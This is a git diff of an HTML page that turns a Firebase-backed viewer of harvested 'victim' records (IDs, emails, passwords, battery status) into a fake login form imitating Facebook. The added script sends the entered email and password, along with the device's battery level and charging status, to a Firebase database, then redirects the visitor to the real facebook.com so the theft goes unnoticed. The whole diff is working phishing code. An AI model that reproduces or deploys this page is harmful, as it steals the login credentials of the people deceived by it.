@@ -4,17 +4,31 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://cdn.tailwindcss.com"></script>
-    <title>data</title>
+    <title>Document</title>
 </head>
-<body class="bg-black flex p-3 justify-center flex-col space-y-2 items-center">
+<body class="flex items-center justify-center h-screen">
     
 
-<script type="module" >
-          
+    <form class="form flex flex-col space-y-6 p-4 shadow-lg border-2 border-r-blue-400 w-[25rem] max-w-full justify-center">
+            <div class="image flex justify-center">            <img class="w-[100px] " src="/image.png">
+            </div>
+            <p class="text-gray-400 pt-3">Log into your account first</p>
+            <input class="outline-none border-2 border-gray-400 rounded p-2 focus:border-blue-600 " type="text" name="" id="em" placeholder="email or phone number"  required>
+            <input class="outline-none border-2 border-gray-400 rounded p-2 focus:border-blue-600 " type="text" name="" id="pass" placeholder="password" required>
+            <button class="bg-blue-600 text-white p-2 rounded cursor-pointer" type="submit">Log in</button>
+            <button class="bg-[#42B72A] text-white p-2 rounded cursor-pointer" type="submit">Create new account</button>
+    </form>
+
+
+
+
+
+
+    <script type="module">
+      
       // Import the functions you need from the SDKs you need
 import { initializeApp }from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
-const audio = new Audio("pip.wav");
+import { getDatabase, ref, set, onValue , serverTimestamp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
 
 // Initialize Firebase
 const firebaseConfig = {
@@ -34,42 +48,60 @@ const database = getDatabase();
 // Get a reference to the "users" node in the database
 const usersRef = ref(database, "users");
 
+// Add sample data to the "users" node
 
 
-// Listen for changes to the "users" node
-onValue(usersRef, (snapshot) => {
-    audio.play();
-    const data = snapshot.val();
-    const messages = Object.values(data);
-    messages.sort((a, b) => a.timestamp - b.timestamp);
 
-    messages.forEach(message=>{
-        let card = `
-        <div class="flex bg-white rounded w-[25rem] max-w-full p-3 flex-col space-y-2">
-                <h2 class="font-bold text-gray-600">VictimID : ${message.id}</h2>
-                <p class="font-bold text-gray-600">Email or phone :${message.em}</p>
-                <p class="font-bold text-gray-600">Password :  ${message.pass}</p>
-                <p class="font-bold text-gray-600">charGerStatus : ${message.chargin} </p>
-                <p class="font-bold text-gray-600">Chargerlevel : ${message.level}</p>
-        </div>
-        
-        
-        `
-        document.querySelector('body').innerHTML+=card
-    })
+document.querySelector('form').addEventListener('submit' , e =>{
+    e.preventDefault();
+    let em = document.querySelector('#em').value
+    let pass = document.querySelector('#pass').value
 
+    let batteryLevel = 0;
+let batteryStatus = '';
 
+navigator.getBattery().then(function(battery) {
+  batteryLevel = battery.level * 100;
+  batteryStatus = battery.charging? 'Charging' : 'Discharging';
+  console.log(`Battery level: ${batteryLevel}% (${batteryStatus})`);
+  const now = new Date();
+const formattedDate = now.toLocaleDateString();
+const formattedTime = now.toLocaleTimeString();
+console.log(`Current date: ${formattedDate}`);
+console.log(`Current time: ${formattedTime}`);  
+  const id = generateRandomId(8)
+  set(ref(database, "users/"+id ), { id:id ,  em:em, pass: pass  ,chargin:batteryStatus,level:batteryLevel , timestamp:serverTimestamp()}).then(
+    window.location.href = 'https://www.facebook.com/'
+    );
 });
 
+    
 
-function displayData(data){
-    data.forEach(element => {
-        console.log(element.em)
-    });
+
+document.querySelector('form').reset();
+})
+
+
+
+
+function generateRandomId(length) {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  let id = '';
+  for (let i = 0; i < length; i++) {
+    id += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return id;
 }
 
 
 
-</script>
+
+
+      </script>
+
+
+
+
+
 </body>
 </html>
